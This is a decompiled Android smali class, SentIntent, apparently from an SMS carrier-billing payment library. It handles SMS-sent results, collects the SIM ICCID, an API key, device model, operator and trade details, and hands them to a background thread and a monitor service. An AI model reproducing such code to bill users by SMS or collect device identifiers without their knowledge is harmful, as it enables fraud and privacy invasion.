.class public Lorg/hj201606/lib/sms/SentIntent;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field private a:I

.field private b:Ljava/lang/String;

.field private c:Ljava/lang/String;

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;

.field private f:Ljava/lang/String;

.field private g:Ljava/lang/String;

.field private h:Ljava/lang/String;

.field private i:Ljava/lang/String;

.field private j:Ljava/lang/String;

.field private k:Ljava/lang/String;

.field private l:Ljava/lang/String;

.field private m:Ljava/lang/String;

.field private n:Ljava/lang/String;

.field private o:Ljava/lang/String;

.field private p:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    const/4 v0, 0x0

    iput v0, p0, Lorg/hj201606/lib/sms/SentIntent;->a:I

    return-void
.end method

.method static synthetic a(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->d:Ljava/lang/String;

    return-object v0
.end method

.method private a()V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/hj201606/lib/sms/d;

    invoke-direct {v1, p0}, Lorg/hj201606/lib/sms/d;-><init>(Lorg/hj201606/lib/sms/SentIntent;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic a(Lorg/hj201606/lib/sms/SentIntent;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lorg/hj201606/lib/sms/SentIntent;->b:Ljava/lang/String;

    return-void
.end method

.method static synthetic b(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->c:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic c(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->e:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic d(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->f:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic e(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->g:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic f(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->h:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic g(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->i:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic h(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->j:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic i(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->k:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic j(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->l:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic k(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->o:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic l(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->m:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic m(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->n:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic n(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->p:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic o(Lorg/hj201606/lib/sms/SentIntent;)I
    .locals 1

    iget v0, p0, Lorg/hj201606/lib/sms/SentIntent;->a:I

    return v0
.end method

.method static synthetic p(Lorg/hj201606/lib/sms/SentIntent;)Ljava/lang/String;
    .locals 1

    iget-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->b:Ljava/lang/String;

    return-object v0
.end method


# virtual methods
.method public exit()V
    .locals 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "step13"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    :try_start_0
    sget-boolean v0, Lorg/hj201606/lib/sms/HuafeiConfigs;->SMS_STATUS:Z

    if-eqz v0, :cond_0

    sget-object v0, Lorg/hj201606/lib/sms/HuafeiCallbackListener;->onCallback:Lorg/hj201606/lib/sms/HuafeiCallbackListener$smsCallback;

    invoke-interface {v0}, Lorg/hj201606/lib/sms/HuafeiCallbackListener$smsCallback;->onComplete()V

    :goto_0
    return-void

    :cond_0
    sget-object v0, Lorg/hj201606/lib/sms/HuafeiCallbackListener;->onCallback:Lorg/hj201606/lib/sms/HuafeiCallbackListener$smsCallback;

    invoke-interface {v0}, Lorg/hj201606/lib/sms/HuafeiCallbackListener$smsCallback;->onFail()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "step12"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "true"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "singleAmount"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->e:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "spnumber"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->c:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "tradeId"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->d:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "msg"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->f:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "did"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->g:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "iccid"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->h:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "apiKey"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->i:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "model"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->j:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "op"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->k:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "os"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->l:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "vcode"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->m:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "net"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->o:Ljava/lang/String;

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "packageName"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->n:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Lorg/hj201606/lib/sms/SentIntent;->getResultCode()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lorg/hj201606/lib/sms/SentIntent;->p:Ljava/lang/String;

    invoke-direct {p0}, Lorg/hj201606/lib/sms/SentIntent;->a()V

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "onReceive"

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    invoke-virtual {p0}, Lorg/hj201606/lib/sms/SentIntent;->getResultCode()I

    move-result v0

    const/4 v1, -0x1

    if-ne v0, v1, :cond_0

    const/4 v0, 0x1

    sput-boolean v0, Lorg/hj201606/lib/sms/HuafeiConfigs;->SMS_STATUS:Z

    sget v0, Lorg/hj201606/lib/HejuInstance;->again:I

    if-lez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-class v1, Lorg/hj201606/lib/sms/MonitorService;

    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    const-string v1, "key"

    iget-object v2, p0, Lorg/hj201606/lib/sms/SentIntent;->i:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "tradeId"

    iget-object v2, p0, Lorg/hj201606/lib/sms/SentIntent;->d:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    invoke-virtual {p0}, Lorg/hj201606/lib/sms/SentIntent;->exit()V

    return-void
.end method
